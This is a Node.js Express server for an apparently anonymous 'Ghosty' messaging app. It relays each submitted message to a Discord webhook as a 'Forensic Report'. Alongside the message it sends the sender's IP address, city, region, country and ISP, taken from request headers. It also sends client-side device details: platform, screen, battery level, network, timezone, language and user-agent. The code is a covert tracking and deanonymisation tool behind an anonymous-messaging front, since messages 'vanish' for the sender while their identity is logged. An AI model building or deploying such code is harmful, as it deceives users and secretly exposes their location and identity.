const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const rateLimit = require('express-rate-limit');

const app = express();

// 🛡️ SPAM SHIELD: 1 message every 30 seconds per IP
const msgLimiter = rateLimit({
    windowMs: 30 * 1000,
    max: 1,
    handler: (req, res) => {
        res.status(429).json({ error: "Ghost is resting! Please wait 30 seconds. 👻" });
    },
    standardHeaders: true,
    legacyHeaders: false,
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const DISCORD_WEBHOOK = process.env.WEBHOOK_URL;

// 🕵️ API ROUTE: Receives message and advanced intel
app.post('/api/send', msgLimiter, async (req, res) => {
    const { message, deviceInfo } = req.body;

    // Vercel Edge Intelligence Headers
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";
    const city = req.headers['x-vercel-ip-city'] || "Localhost";
    const country = req.headers['x-vercel-ip-country'] || "Local";
    const region = req.headers['x-vercel-ip-country-region'] || "Region";
    const isp = req.headers['x-vercel-ip-as-number'] || "Unknown ISP";

    if (!DISCORD_WEBHOOK) return res.status(500).json({ error: "Server Configuration Error" });
    if (!message || message.length < 2) return res.status(400).json({ error: "Message too short!" });

    try {
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "🕵️ Ghosty Forensic Report",
                    description: `**Message:**\n>>> ${message}`,
                    color: 3447003,
                    fields: [
                        { name: "📍 Location", value: `${city}, ${region}, ${country}`, inline: true },
                        { name: "🌐 Network", value: `IP: ||${ip}||\nISP: ${isp}\nSignal: ${deviceInfo?.network || 'N/A'}`, inline: true },
                        { name: "📱 Device", value: `${deviceInfo?.platform || 'Unknown'}\n${deviceInfo?.screen || 'N/A'}`, inline: true },
                        { name: "🔋 Battery", value: `${deviceInfo?.battery?.level || '??'} (${deviceInfo?.battery?.charging || '??'})`, inline: true },
                        { name: "🕒 Timezone", value: deviceInfo?.timezone || "Unknown", inline: true },
                        { name: "🗣️ Language", value: deviceInfo?.language || "Unknown", inline: true }
                    ],
                    footer: { text: `User-Agent: ${deviceInfo?.browser?.substring(0, 80)}...` },
                    timestamp: new Date()
                }]
            })
        });

        if (response.ok) res.json({ success: true });
        else throw new Error("Discord Error");
    } catch (err) {
        res.status(500).json({ error: "Failed to vanish message." });
    }
});

// Serve frontend
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server (for local testing)
if (process.env.NODE_ENV !== 'production') {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => console.log(`🚀 Ghosty live: http://localhost:${PORT}`));
}

module.exports = app;